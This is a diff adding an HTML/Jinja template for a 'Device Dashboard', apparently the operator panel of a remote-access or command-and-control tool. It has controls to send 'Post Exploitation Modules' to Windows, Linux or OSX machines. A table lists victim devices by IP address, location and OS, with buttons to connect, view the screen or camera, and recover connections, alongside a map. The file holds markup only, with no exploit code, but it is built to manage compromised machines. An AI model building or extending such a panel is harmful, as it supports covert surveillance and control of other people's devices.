@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Device Dashboard</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    {% if style == True %}
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/light/index.css') }}"
+    />
+    {% else %}
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/dark/index.css') }}"
+    />
+    {% endif %}
+  </head>
+  <body>
+    <header>
+      <nav>
+        <ul>
+          <li><a href="/" class="active">Control Panel</a></li>
+          <li><a href="/payload">Payload</a></li>
+          <li><a href="/files">Files</a></li>
+          <li><a href="/logout">Logout</a></li>
+        </ul>
+      </nav>
+    </header>
+
+    <h1>Device Dashboard</h1>
+
+    <div id="popup-alert">
+      <div id="popup-message"></div>
+      <button id="popup-ok-btn">OK</button>
+    </div>
+
+    <div id="container">
+      <div id="panel">
+        <div class="payload-container">
+          <select id="pem-dropdown">
+            <option value="send-command" os="['linux', 'windows', 'osx']">
+              Send Command
+            </option>
+            {% for pem_key, pem_info in pem_data.items() %}
+            <option
+              value="{{ pem_info.uid }}"
+              os="{{ pem_info.os }}"
+              path="{{ pem_info.pem_path }}"
+            >
+              {{ pem_info.pem_name }}
+            </option>
+            {% endfor %}
+          </select>
+          <input style="display: none" id="pem-input" />
+          Supported OS
+          <div>
+            <img
+              id="pem-windows"
+              src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg"
+              alt="Windows OS"
+            />
+            <img
+              id="pem-linux"
+              src="https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg"
+              alt="Linux OS"
+            />
+            <img
+              id="pem-osx"
+              src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
+              alt="OSX"
+            />
+          </div>
+          <br />
+          <!-- OS Select All with Checkboxes -->
+          <div class="os-selection">
+            <p>
+              <input type="checkbox" id="select-all-os" />
+              Select All&nbsp;
+            </p>
+            <p>
+              <input type="checkbox" id="select-linux" class="os-checkbox" />
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg"
+                alt="Linux Logo"
+              />
+              Linux
+            </p>
+            <p>
+              <input type="checkbox" id="select-windows" class="os-checkbox" />
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg"
+                alt="Windows Logo"
+              />
+              Windows
+            </p>
+            <p>
+              <input type="checkbox" id="select-osx" class="os-checkbox" />
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
+                alt="MacOS Logo"
+              />
+              OSX
+            </p>
+          </div>
+          <button onclick="send_pem()">Send Post Exploitation Module</button>
+        </div>
+      </div>
+
+      <div id="map"></div>
+    </div>
+
+    <div id="device-table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Checked</th>
+            <th>
+              <input
+                type="text"
+                id="device-id-search"
+                placeholder="Device ID"
+              />
+            </th>
+            <th>
+              <input type="text" id="location-search" placeholder="Location" />
+            </th>
+            <th>
+              <input type="text" id="status-search" placeholder="Status" />
+            </th>
+            <th>
+              <input
+                type="text"
+                id="last-online-search"
+                placeholder="Last Online"
+              />
+            </th>
+            <th><input type="text" id="os-search" placeholder="OS" /></th>
+            <th>
+              <input
+                type="text"
+                id="ip-address-search"
+                placeholder="IP Address"
+              />
+            </th>
+            <th>Connect</th>
+            <th>Screen/Camera Viewer</th>
+            <th>Recover Connection</th>
+            <th>Delete</th>
+          </tr>
+        </thead>
+        <tbody id="device-table">
+          <!-- Device rows will be added here -->
+        </tbody>
+      </table>
+    </div>
+
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    {% if show_login == True %}
+    <script>
+      var show_logout_button = true;
+    </script>
+    {% else %}
+    <script>
+      var show_logout_button = false;
+    </script>
+    {% endif %} {% if ip_state == True %}
+    <script>
+      var private_public = true;
+    </script>
+    {% else %}
+    <script>
+      var private_public = false;
+    </script>
+    {% endif %}
+    <script src="{{ url_for('static', filename='js/index.js') }}"></script>
+  </body>
+</html>
